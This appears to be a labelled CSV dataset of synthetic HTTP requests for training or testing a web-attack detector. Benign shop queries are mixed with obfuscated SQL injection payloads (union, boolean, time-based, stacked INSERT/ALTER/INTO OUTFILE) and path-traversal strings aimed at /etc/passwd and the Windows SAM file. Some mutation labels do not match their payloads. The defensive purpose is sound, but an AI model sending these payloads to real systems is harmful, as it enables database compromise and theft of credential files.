timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-09-29T11:01:39Z,10.45.XXX.XXX,GET,/product,"{""id"": ""43"", ""ref"": ""33""}",,,GET /product?id=43&ref=33 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1a860a775f3f293d6ff089cdbf35a9d5
2025-01-10T23:44:56Z,10.157.XXX.XXX,POST,/comment,,username=3&comment=hotel booking,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=3&comment=hotel booking",0.0,,,,,0.0,dataset.csv,,,,291e9be7219b8622fc00a03ecbfa09f8
2025-05-18T12:49:57Z,10.142.XXX.XXX,GET,/search,"{""q"": ""john_doe""}",,,GET /search?q=john_doe HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5f20204fb8fe79e0a4db36d191512892
2025-05-30T12:33:43Z,10.118.XXX.XXX,GET,/search,"{""q"": ""john_doe""}",,,GET /search?q=john_doe HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5f20204fb8fe79e0a4db36d191512892
2025-05-12T10:22:02Z,10.156.XXX.XXX,GET,/search,"{""q"": ""john_doe""}",,,GET /search?q=john_doe HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5f20204fb8fe79e0a4db36d191512892
2025-06-15T15:14:13Z,10.0.XXX.XXX,GET,/search,"{""q"": ""best helmet""}",,,GET /search?q=best helmet HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f97741f23126fe83a5b0d3935ba62213
2025-02-18T12:10:40Z,10.165.XXX.XXX,GET,/search,"{""q"": ""best helmet""}",,,GET /search?q=best helmet HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f97741f23126fe83a5b0d3935ba62213
2025-05-24T06:56:58Z,10.70.XXX.XXX,GET,/search,"{""q"": ""best helmet""}",,,GET /search?q=best helmet HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f97741f23126fe83a5b0d3935ba62213
2025-01-12T19:08:53Z,10.123.XXX.XXX,POST,/api/search,,"{{""user"":""17"",""query"":""JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwsTlVMTC0t""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""17"",""query"":""JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwsTlVMTC0t""}}",1.0,union,body_json,comment_insert,p0041,0.8,dataset.csv,,,,73404bbf685a37b65aa2b849ba015e48
2025-03-18T02:13:18Z,10.237.XXX.XXX,POST,/comment,,username=alice&comment=travel destinations review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=alice&comment=travel destinations review",0.0,,,,,0.0,dataset.csv,,,,ee4670f28319819fc122f712f548faa8
2025-02-09T16:22:58Z,10.40.XXX.XXX,GET,/item,"{""id"": ""python tutorial""}",,,GET /item?id=python tutorial HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,6ee91627f87325e8f2e0da0f24ffdd61
2025-06-05T15:40:37Z,10.234.XXX.XXX,GET,/item,"{""id"": ""python tutorial""}",,,GET /item?id=python tutorial HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,6ee91627f87325e8f2e0da0f24ffdd61
2025-08-20T01:35:50Z,10.99.XXX.XXX,GET,/item,"{""id"": ""python tutorial""}",,,GET /item?id=python tutorial HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,6ee91627f87325e8f2e0da0f24ffdd61
2025-09-10T11:53:04Z,10.170.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":224}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":224}}}}",0.0,,,,,0.0,dataset.csv,,,,2e2905e35c0c5aa9e883a6284613e703
2025-04-29T06:29:25Z,10.194.XXX.XXX,GET,/item/4007/details,,,,GET /item/4007/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,7d35036b231ad4855d54b12fcabf0459
2025-03-14T17:14:10Z,10.150.XXX.XXX,GET,/search,"{""q"": ""flight tickets review""}",,,GET /search?q=flight tickets review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5b9dfc058562b05a9010158f64ea40d1
2025-03-06T00:55:05Z,10.124.XXX.XXX,GET,/search,"{""q"": ""flight tickets review""}",,,GET /search?q=flight tickets review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5b9dfc058562b05a9010158f64ea40d1
2025-08-07T18:26:10Z,10.74.XXX.XXX,GET,/search,"{""q"": ""flight tickets review""}",,,GET /search?q=flight tickets review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5b9dfc058562b05a9010158f64ea40d1
2025-01-03T16:00:06Z,192.168.XXX.XXX,POST,/comment,,username=%27%2520OR%25201%23%2500&comment=67,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%2520OR%25201%23%2500&comment=67",1.0,boolean,body_form,base64,p0017,1.0,dataset.csv,,,,ddbaf0aea050f8d47fc45fe3b4ccc7fb
2025-06-27T15:20:52Z,10.133.XXX.XXX,POST,/comment,,username=%252527%252520OR%252520BENCHMARK%2525285000000%25252CMD5%252528%252527A%252527%252529%252529--&comment=bike price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%252527%252520OR%252520BENCHMARK%2525285000000%25252CMD5%252528%252527A%252527%252529%252529--&comment=bike price",1.0,time-based,body_form,case_obf,p0075,0.6000000000000001,dataset.csv,,,,34dfc2acf8a23bb2b02dcb79fc894f53
2025-03-09T20:06:33Z,10.108.XXX.XXX,GET,/product,"{""id"": ""shirt price"", ""ref"": ""' OR 1=1#""}",,,GET /product?id=shirt price&ref=' OR 1=1# HTTP/1.1,1.0,boolean,query_param,base64,p0004,1.0,dataset.csv,,,,ad730842cfe9eca7f2372a83fc11f429
2025-10-23T12:51:05Z,10.43.XXX.XXX,GET,/search,"{""q"": ""90""}",,,GET /search?q=90 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,01a2bb0aff0b7d8846eca2933261bf32
2025-07-17T07:25:00Z,10.80.XXX.XXX,GET,/search,"{""q"": ""90""}",,,GET /search?q=90 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,01a2bb0aff0b7d8846eca2933261bf32
2025-10-01T04:31:07Z,10.203.XXX.XXX,GET,/search,"{""q"": ""90""}",,,GET /search?q=90 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,01a2bb0aff0b7d8846eca2933261bf32
2025-09-02T12:46:07Z,10.207.XXX.XXX,GET,/product,"{""id"": ""'/**/UNION/**/ALL/**/SELECT/**/NULL--%00%00"", ""ref"": ""4""}",,,GET /product?id='/**/UNION/**/ALL/**/SELECT/**/NULL--%00%00&ref=4 HTTP/1.1,1.0,union,query_param,comment_insert,p0179,0.7,dataset.csv,,,,cb75a8b1a3ce7e1514879f9c2712f806
2025-01-22T20:13:28Z,10.26.XXX.XXX,POST,/comment,,username=camera 2025&comment=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=camera 2025&comment=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A",1.0,boolean,body_form,url_encode,p0005,0.6,dataset.csv,,,,93c286055aedca8e8b472aa97b651c40
2025-09-27T13:33:49Z,10.96.XXX.XXX,GET,/product,"{""id"": ""machine learning 2025"", ""ref"": ""';/**/INSERT/**/INTO/**/users/**/VALUES('hacker','pass')--""}",,,"GET /product?id=machine learning 2025&ref=';/**/INSERT/**/INTO/**/users/**/VALUES('hacker','pass')-- HTTP/1.1",1.0,stacked,query_param,none,p0089,0.3,dataset.csv,,,,f8905dc5d5250ec01db1a61bfee12aca
2025-06-02T17:40:50Z,10.207.XXX.XXX,POST,/api/search,,"{{""user"":""Bag"",""query"":""59""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""Bag"",""query"":""59""}}",0.0,,,,,0.0,dataset.csv,,,,b0cc6b5482137b286b3dc24f710d7f65
2025-03-21T03:07:59Z,10.83.XXX.XXX,GET,/item,"{""id"": ""23""}",,,GET /item?id=23 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ce50a0cba89a2531475d3c7d33ec1349
2025-10-07T12:31:32Z,10.117.XXX.XXX,GET,/item,"{""id"": ""23""}",,,GET /item?id=23 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ce50a0cba89a2531475d3c7d33ec1349
2025-07-01T07:34:35Z,10.208.XXX.XXX,GET,/item,"{""id"": ""23""}",,,GET /item?id=23 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ce50a0cba89a2531475d3c7d33ec1349
2025-05-03T12:14:24Z,10.100.XXX.XXX,GET,/search,"{""q"": ""36""}",,,GET /search?q=36 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,c8faa902b16c7b172a5c6c225aa2f7b8
2025-10-08T04:24:24Z,10.109.XXX.XXX,GET,/search,"{""q"": ""36""}",,,GET /search?q=36 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,c8faa902b16c7b172a5c6c225aa2f7b8
2025-07-10T19:09:16Z,10.99.XXX.XXX,GET,/search,"{""q"": ""36""}",,,GET /search?q=36 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,c8faa902b16c7b172a5c6c225aa2f7b8
2025-07-02T04:36:58Z,10.234.XXX.XXX,GET,/item,"{""id"": ""85""}",,,GET /item?id=85 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f6ff840765e86699f6ffd4fe366415b5
2025-04-02T04:44:01Z,10.236.XXX.XXX,GET,/item,"{""id"": ""85""}",,,GET /item?id=85 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f6ff840765e86699f6ffd4fe366415b5
2025-06-23T08:11:47Z,10.109.XXX.XXX,GET,/item,"{""id"": ""85""}",,,GET /item?id=85 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f6ff840765e86699f6ffd4fe366415b5
2025-09-03T14:27:09Z,10.83.XXX.XXX,GET,/search,"{""q"": ""pants review""}",,,GET /search?q=pants review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f560ad9fb69e6655e118bf6f13e0d606
2025-04-13T17:08:10Z,10.143.XXX.XXX,GET,/search,"{""q"": ""pants review""}",,,GET /search?q=pants review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f560ad9fb69e6655e118bf6f13e0d606
2025-10-08T05:03:15Z,10.45.XXX.XXX,GET,/search,"{""q"": ""pants review""}",,,GET /search?q=pants review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f560ad9fb69e6655e118bf6f13e0d606
2025-02-25T10:26:56Z,10.117.XXX.XXX,GET,/item,"{""id"": ""1/**/AND/**/1=1""}",,,GET /item?id=1/**/AND/**/1=1 HTTP/1.1,1.0,boolean,query_param,none,p0019,0.2,dataset.csv,,,,3b2c775c7c38f0e74af593b4f083e0d0
2025-10-28T03:42:08Z,10.7.XXX.XXX,POST,/comment,,username=%27%0AOR%0Aa%3Da--&comment=42,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%0AOR%0Aa%3Da--&comment=42",1.0,boolean,body_form,whitespace_obf,p0026,0.6000000000000001,dataset.csv,,,,5ed21c232da869194ef4fb770a719fd2
2025-08-03T18:29:44Z,10.89.XXX.XXX,POST,/comment,,username=shirt 2025&comment=92,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=shirt 2025&comment=92",0.0,,,,,0.0,dataset.csv,,,,7b572a66182560bb3c656d8bb6d3448f
2025-10-04T20:53:18Z,192.168.XXX.XXX,POST,/comment,,username=..%255C..%255C..%255Cwindows%255Csystem32%255Cconfig%255Csam%2500&comment=sofa 2025,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=..%255C..%255C..%255Cwindows%255Csystem32%255Cconfig%255Csam%2500&comment=sofa 2025",1.0,path-injection,body_form,case_obf,p0114,0.6000000000000001,dataset.csv,,,,ad479eccf2464cdd9882df3b7121c44f
2025-01-24T15:28:46Z,10.85.XXX.XXX,GET,/search,"{""q"": ""admin'+OR+'1'='1""}",,,GET /search?q=admin'+OR+'1'='1 HTTP/1.1,1.0,boolean,query_param,none,p0006,0.2,dataset.csv,,,,dfdbef2e72accd73b904b5b943f0d946
2025-09-21T18:04:35Z,10.249.XXX.XXX,GET,/search,"{""q"": ""admin'+OR+'1'='1""}",,,GET /search?q=admin'+OR+'1'='1 HTTP/1.1,1.0,boolean,query_param,none,p0185,0.2,dataset.csv,,,,dfdbef2e72accd73b904b5b943f0d946
2025-04-01T09:11:43Z,10.232.XXX.XXX,POST,/comment,,username=lamp&comment=battery,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=lamp&comment=battery",0.0,,,,,0.0,dataset.csv,,,,5a82074f63b5c0c8aaa10e6ade96e258
2025-07-14T03:33:17Z,10.61.XXX.XXX,GET,/product,"{""id"": ""Helmet"", ""ref"": ""'))/**/or/**/((1=1%00%00""}",,,GET /product?id=Helmet&ref='))/**/or/**/((1=1%00%00 HTTP/1.1,1.0,boolean,query_param,url_encode,p0024,0.4,dataset.csv,,,,f6248ee2263aa7aebfa14792a4824307
2025-05-02T05:26:57Z,10.231.XXX.XXX,GET,/item,"{""id"": ""78""}",,,GET /item?id=78 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3741564e2e025fa61da177273d0ca801
2025-08-27T07:46:26Z,10.15.XXX.XXX,GET,/item,"{""id"": ""78""}",,,GET /item?id=78 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3741564e2e025fa61da177273d0ca801
2025-10-19T05:09:44Z,10.89.XXX.XXX,GET,/item,"{""id"": ""78""}",,,GET /item?id=78 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3741564e2e025fa61da177273d0ca801
2025-07-19T13:26:45Z,10.45.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":770}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":770}}}}",0.0,,,,,0.0,dataset.csv,,,,2d7d3778441a4e30373969800f95b5f5
2025-02-08T11:24:33Z,10.22.XXX.XXX,POST,/comment,,username=mysql database review&comment=hotel booking,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=mysql database review&comment=hotel booking",0.0,,,,,0.0,dataset.csv,,,,45e31d7a094f14ab4c48fa029d2d9d79
2025-10-27T16:59:07Z,192.168.XXX.XXX,GET,/search,"{""q"": ""1'%20UNION%20SELECT%20@@version,NULL,NULL#""}",,,"GET /search?q=1'%20UNION%20SELECT%20@@version,NULL,NULL# HTTP/1.1",1.0,union,query_param,case_obf,p0122,0.5,dataset.csv,,,,051e7dc37f68b7a92346de6ed0290f09
2025-01-05T21:56:28Z,10.23.XXX.XXX,GET,/search,"{""q"": ""1'%20UNION%20SELECT%20@@version,NULL,NULL#""}",,,"GET /search?q=1'%20UNION%20SELECT%20@@version,NULL,NULL# HTTP/1.1",1.0,union,query_param,case_obf,p0122,0.5,dataset.csv,,,,051e7dc37f68b7a92346de6ed0290f09
2025-08-09T20:46:27Z,10.56.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":822}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":822}}}}",0.0,,,,,0.0,dataset.csv,,,,e8ecfed4ac91b8addc3a51dae33ae372
2025-09-30T19:54:11Z,192.168.XXX.XXX,POST,/comment,,username=100&comment=%28%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--%29%2500%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=100&comment=%28%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--%29%2500%2500",1.0,time-based,body_form,hex,p0166,1.0,dataset.csv,,,,7c224f6e907f42c8653d1a240540bd99
2025-03-02T01:17:17Z,10.114.XXX.XXX,GET,/item,"{""id"": ""31""}",,,GET /item?id=31 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3b56950f87cec2436bf20ac50467e79d
2025-07-16T13:37:32Z,10.199.XXX.XXX,GET,/item,"{""id"": ""31""}",,,GET /item?id=31 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3b56950f87cec2436bf20ac50467e79d
2025-04-11T09:15:30Z,10.104.XXX.XXX,GET,/item,"{""id"": ""31""}",,,GET /item?id=31 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3b56950f87cec2436bf20ac50467e79d
2025-07-27T12:47:18Z,10.227.XXX.XXX,POST,/comment,,username=97&comment=Tire,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=97&comment=Tire",0.0,,,,,0.0,dataset.csv,,,,e24ebb2dca9df4532c4ca008af3d5916
2025-09-28T16:06:39Z,10.111.XXX.XXX,GET,/item,"{""id"": ""1 %28%27%20Or%20%271%27%3D%271%27%20AND%20%27%27%3D%27%29%00""}",,,GET /item?id=1 %28%27%20Or%20%271%27%3D%271%27%20AND%20%27%27%3D%27%29%00 HTTP/1.1,1.0,boolean,query_param,url_encode,p0153,0.4,dataset.csv,,,,14903e942150503405ba0f0a4f3ac2c3
2025-05-27T08:52:31Z,10.121.XXX.XXX,GET,/item,"{""id"": ""1 %28%27%20Or%20%271%27%3D%271%27%20AND%20%27%27%3D%27%29%00""}",,,GET /item?id=1 %28%27%20Or%20%271%27%3D%271%27%20AND%20%27%27%3D%27%29%00 HTTP/1.1,1.0,boolean,query_param,whitespace_obf,p0153,0.5,dataset.csv,,,,14903e942150503405ba0f0a4f3ac2c3
2025-05-15T13:41:37Z,10.210.XXX.XXX,POST,/api/search,,"{{""user"":""21"",""query"":""admin' #%00%00%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""21"",""query"":""admin' #%00%00%00""}}",1.0,boolean,body_json,none,p0029,0.4,dataset.csv,,,,bbf6d3327d1c104b2d08c5aafcf5e815
2025-08-26T14:01:29Z,10.102.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""1%2527%253B%2520ALTER%2520TABLE%2520users%2520ADD%2520COLUMN%2520hacked%2520INT--"",""min_price"":927}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""1%2527%253B%2520ALTER%2520TABLE%2520users%2520ADD%2520COLUMN%2520hacked%2520INT--"",""min_price"":927}}}}",1.0,stacked,body_json,case_obf,p0097,0.7,dataset.csv,,,,cf13e59719cfa7afa156cc9ce19a2cdc
2025-04-02T22:53:48Z,10.205.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--%00"",""min_price"":661}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--%00"",""min_price"":661}}}}",1.0,time-based,body_json,case_obf,p0193,0.7,dataset.csv,,,,e1b08eb5bf489cce742dad39f977a94d
2025-04-06T13:40:06Z,10.197.XXX.XXX,GET,/product,"{""id"": ""72"", ""ref"": ""13""}",,,GET /product?id=72&ref=13 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2911e40db071733dee6710ec48536f6c
2025-07-30T14:10:27Z,10.145.XXX.XXX,GET,/item,"{""id"": ""1 '/**/OR/**/1=1#""}",,,GET /item?id=1 '/**/OR/**/1=1# HTTP/1.1,1.0,boolean,query_param,none,p0162,0.2,dataset.csv,,,,a7edd3cc681c10dd5df061969883b734
2025-10-14T12:57:41Z,10.185.XXX.XXX,GET,/item,"{""id"": ""1 '/**/OR/**/1=1#""}",,,GET /item?id=1 '/**/OR/**/1=1# HTTP/1.1,1.0,boolean,query_param,hex,p0004,1.0,dataset.csv,,,,a7edd3cc681c10dd5df061969883b734
2025-10-18T23:34:21Z,10.42.XXX.XXX,POST,/api/search,,"{{""user"":""chair"",""query"":""BIKE""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""chair"",""query"":""BIKE""}}",0.0,,,,,0.0,dataset.csv,,,,93da2d3d941a6da0e35074c3e64af151
2025-04-28T18:22:38Z,10.81.XXX.XXX,GET,/product,"{""id"": ""76"", ""ref"": ""'\tUNION\tSeLeCt\t1,2,3--%00""}",,,"GET /product?id=76&ref='	UNION	SeLeCt	1,2,3--%00 HTTP/1.1",1.0,union,query_param,base64,p0182,1.0,dataset.csv,,,,5d6a63882bf3420768ed13830f0bb968
2025-06-14T01:33:53Z,10.226.XXX.XXX,POST,/comment,,username=4&comment=97,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=4&comment=97",0.0,,,,,0.0,dataset.csv,,,,2ae7b32e3426def7df4f27743d7cf264
2025-01-02T17:56:15Z,10.14.XXX.XXX,GET,/product,"{""id"": ""phone price"", ""ref"": ""Lamp""}",,,GET /product?id=phone price&ref=Lamp HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,55cf766932fd673187997f02ba0eb6bc
2025-02-09T14:11:36Z,10.64.XXX.XXX,GET,/product,"{""id"": ""sofa price"", ""ref"": ""45""}",,,GET /product?id=sofa price&ref=45 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,254975f11484375b89a8a129825e26e0
2025-04-22T15:35:34Z,10.45.XXX.XXX,GET,/search,"{""q"": ""table price""}",,,GET /search?q=table price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,05af067e054c35709af9999d3d81cecc
2025-06-21T04:31:38Z,10.250.XXX.XXX,GET,/search,"{""q"": ""table price""}",,,GET /search?q=table price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,05af067e054c35709af9999d3d81cecc
2025-10-24T10:05:55Z,10.199.XXX.XXX,GET,/search,"{""q"": ""table price""}",,,GET /search?q=table price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,05af067e054c35709af9999d3d81cecc
2025-04-11T15:11:08Z,10.233.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":130}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":130}}}}",0.0,,,,,0.0,dataset.csv,,,,39aa75340dcf5856f0e1c8d3cd8089b5
2025-05-09T19:41:02Z,10.72.XXX.XXX,GET,/item,"{""id"": ""best mysql database""}",,,GET /item?id=best mysql database HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f825f6fa3cbb2fa405f6a73ed4b16e57
2025-01-18T07:20:35Z,10.208.XXX.XXX,GET,/item,"{""id"": ""best mysql database""}",,,GET /item?id=best mysql database HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f825f6fa3cbb2fa405f6a73ed4b16e57
2025-09-12T12:48:14Z,10.177.XXX.XXX,GET,/item,"{""id"": ""best mysql database""}",,,GET /item?id=best mysql database HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f825f6fa3cbb2fa405f6a73ed4b16e57
2025-09-22T07:25:20Z,10.7.XXX.XXX,POST,/api/search,,"{{""user"":""93"",""query"":""helmet price""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""93"",""query"":""helmet price""}}",0.0,,,,,0.0,dataset.csv,,,,857c7aa2c343a865e8bcc63afd342541
2025-08-01T11:58:02Z,10.71.XXX.XXX,GET,/item,"{""id"": ""%2527%2520AND%25201%253DCAST%2528%2540%2540version%2520AS%2520int%2529--""}",,,GET /item?id=%2527%2520AND%25201%253DCAST%2528%2540%2540version%2520AS%2520int%2529-- HTTP/1.1,1.0,error,query_param,comment_insert,p0056,0.6,dataset.csv,,,,78fc3730a0a3902c6a4ee65beeb43507
2025-09-18T07:28:34Z,10.202.XXX.XXX,GET,/product,"{""id"": ""%27%20%41%4e%44%20%28%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d"", ""ref"": ""11""}",,,GET /product?id=%27%20%41%4e%44%20%28%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%61%29%2d%2d&ref=11 HTTP/1.1,1.0,time-based,query_param,comment_insert,p0123,0.8,dataset.csv,,,,dd8ad383748085e22e21666631c30bcb
2025-08-23T23:31:18Z,10.255.XXX.XXX,POST,/comment,,username=javascript guide review&comment=david,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=javascript guide review&comment=david",0.0,,,,,0.0,dataset.csv,,,,3cbb9e6ff35d839041ad05b581e3cff4
2025-07-26T01:17:02Z,10.21.XXX.XXX,GET,/product,"{""id"": ""react documentation review"", ""ref"": ""best bike""}",,,GET /product?id=react documentation review&ref=best bike HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,b02c517bf4bca14838d8613f80a28107
2025-07-02T15:21:08Z,10.250.XXX.XXX,GET,/search,"{""q"": ""1';\tSeLeCt\t*\tINTO\tOUTFILE\t'/tmp/out.txt'#%00""}",,,GET /search?q=1';	SeLeCt	*	INTO	OUTFILE	'/tmp/out.txt'#%00 HTTP/1.1,1.0,stacked,query_param,hex,p0094,1.0,dataset.csv,,,,f8762d7bb10d61bddd2f0df975b799db
2025-10-21T12:52:12Z,10.194.XXX.XXX,GET,/item,"{""id"": ""..;/..;/..;/etc/passwd""}",,,GET /item?id=..;/..;/..;/etc/passwd HTTP/1.1,1.0,path-injection,query_param,none,p0119,0.2,dataset.csv,,,,de77670cbcd47ea8c56bd3ac6b343e54
2025-01-06T10:00:08Z,10.216.XXX.XXX,GET,/item,"{""id"": ""..;/..;/..;/etc/passwd""}",,,GET /item?id=..;/..;/..;/etc/passwd HTTP/1.1,1.0,path-injection,query_param,base64,p0169,1.0,dataset.csv,,,,de77670cbcd47ea8c56bd3ac6b343e54
2025-07-28T04:30:23Z,10.32.XXX.XXX,GET,/item,"{""id"": ""..;/..;/..;/etc/passwd""}",,,GET /item?id=..;/..;/..;/etc/passwd HTTP/1.1,1.0,path-injection,query_param,none,p0119,0.2,dataset.csv,,,,de77670cbcd47ea8c56bd3ac6b343e54
